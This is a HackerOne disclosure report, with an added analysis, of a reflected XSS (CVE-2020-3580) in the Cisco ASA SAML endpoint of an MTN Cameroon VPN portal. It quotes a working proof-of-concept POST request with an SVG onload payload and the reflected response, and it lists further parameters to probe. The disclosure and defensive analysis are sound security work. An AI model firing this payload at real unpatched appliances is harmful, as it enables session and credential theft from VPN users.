# Reflected Cross Site Scripting (XSS) in Cisco ASA Web Services Interface - CVE-2020-3580

## Metadata
- **Source:** HackerOne
- **Report:** 1247833 | https://hackerone.com/reports/1247833
- **Submitted:** 2021-06-30
- **Reporter:** renzi
- **Program:** MTN Cameroon (myvpn.mtncameroon.net)
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** Reflected Cross-Site Scripting (XSS), Improper Input Validation, Improper Output Encoding
- **CVEs:** CVE-2020-3580
- **Category:** web-api

## Summary
A reflected XSS vulnerability exists in the Cisco ASA SAML service provider endpoint (/+CSCOE+/saml/sp/acs) where user-supplied input via the SAMLResponse parameter is inadequately sanitized before being reflected in HTML form fields. An unauthenticated remote attacker can inject malicious JavaScript code that executes in the context of an authenticated user's browser session, potentially leading to session hijacking or credential theft.

## Attack scenario
1. Attacker crafts a malicious URL containing XSS payload in the SAMLResponse parameter targeting the vulnerable SAML endpoint
2. Attacker sends the crafted URL to a targeted VPN user via phishing email or social engineering
3. Victim clicks the malicious link while authenticated to the VPN portal
4. The vulnerable Cisco ASA reflects the XSS payload unsanitized within an HTML input value attribute
5. Browser executes the injected JavaScript in the security context of the VPN portal domain
6. Attacker's script can harvest session cookies, capture credentials, or perform actions on behalf of the authenticated user

## Root cause
The SAML service provider endpoint fails to properly HTML-encode user-supplied input (SAMLResponse parameter) before inserting it into the value attribute of an HTML form input element. The application reflects the untrusted data directly without sanitization or encoding, allowing script injection.

## Attacker mindset
An opportunistic attacker exploiting a known vulnerability in widely-deployed enterprise security appliances. The attacker likely targets organizations using Cisco ASA VPN portals to harvest credentials or gain lateral network access. Using a public CVE makes this a low-effort, high-impact attack vector against corporate VPN users.

## Defensive takeaways
- Implement strict output encoding for all user-supplied input - use context-appropriate encoding (HTML entity encoding for HTML content, JavaScript encoding for JavaScript contexts)
- Apply Content Security Policy (CSP) headers to mitigate XSS impact even if injection occurs
- Use security frameworks that automatically handle output encoding (avoid string concatenation for HTML generation)
- Validate and sanitize all SAML-related parameters before processing and reflecting them
- Implement input validation to reject unexpected characters in SAML parameters
- Apply security patches promptly - this CVE was published and patched by Cisco before this report
- Use HTTPOnly and Secure flags on session cookies to prevent JavaScript access
- Implement Web Application Firewall (WAF) rules to detect and block common XSS patterns
- Conduct regular security testing including SAST/DAST to identify reflection points

## Variant hunting
Search for similar SAML parameter injection in other endpoints: /+webvpn+/, /+cscoe+/, /portal endpoints. Test other SAML-related parameters (RelayState, SAMLRequest, tgname, group_list). Check for DOM-based XSS in JavaScript that processes these parameters. Investigate other form field reflections in authentication/SSO flows.

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1598 - Phishing
- T1056 - Input Capture
- T1539 - Steal Web Session Cookie
- T1563 - Steal Application Access Token

## Notes
This is a post-CVE disclosure report on a known vulnerability (CVE-2020-3580). The vulnerability affects unauthenticated users of the SAML endpoint but requires victim interaction. The presence of unpatched Cisco ASA instances in 2021 indicates delayed patch deployment in enterprise environments. The PoC uses a simple SVG payload, but more sophisticated attacks could harvest authentication tokens or session data. MTN Cameroon should have patched this immediately upon Cisco's security advisory release.

## Full report
<details><summary>Expand</summary>

##Summary:

Hello, I would like report this vulnerability to MTN, Cross Site Scripting on Cisco ASA CVE-2020-3580.

Multiple vulnerabilities in the web services interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to conduct cross-site scripting (XSS) attacks against a user of the web services interface of an affected device.

##Steps To Reproduce:
###how we can reproduce the issue;

1.Go to  https://myvpn.mtncameroon.net ;
2. Intercept request with burp suite and send this "POST" Request, we will see response with JavaScript ..

* Request
```
POST /+CSCOE+/saml/sp/acs?tgname=a HTTP/1.1
Host: myvpn.mtncameroon.net
Cookie: webvpnlogin=1; webvpnLang=en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close
Content-Length: 42

SAMLResponse="><svg/onload=alert('Renzi')>
```

* Response
```html
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
Pragma: no-cache
Connection: Keep-Alive
Date: Wed, 30 Jun 2021 00:59:25 GMT
X-Frame-Options: SAMEORIGIN
Content-Length: 761


<html>
<head>
<script>
function submit_saml() {
    document.cookie = "webvpnlogin=1; path=/; secure";
    document.createElement('form').submit.call(document.getElementById('samlform'));
}
</script>
</head>
<body onload="submit_saml()">
<form id="samlform" action="/+webvpn+/index.html" method="POST">
<input type="hidden" name="tgroup" value="">
<input type="hidden" name="next" value="">
<input type="hidden" name="tgcookieset" value="">
<input type="hidden" name="group_list" value="a">
<input type="hidden" name="username" value="">
<input type="hidden" name="password" value="">
<input type="hidden" name="SAMLResponse" value=""><svg/onload=alert('Renzi')>">
<input type="submit" name="Login" value="Login" style="display:none;">
</form>
</body>
</html>
```

3.Response with JavaScript alert, Proof of Concept XSS.

{F1358622}

##Supporting Material/References:

* https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-asaftd-xss-multiple-FCB3vPZe.html
* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-3580

## Impact

A successful exploit could allow the attacker to execute arbitrary script code in the context of the interface or allow the attacker to access sensitive, browser-based information.

</details>

---
*Analysed by Claude on 2026-05-12*
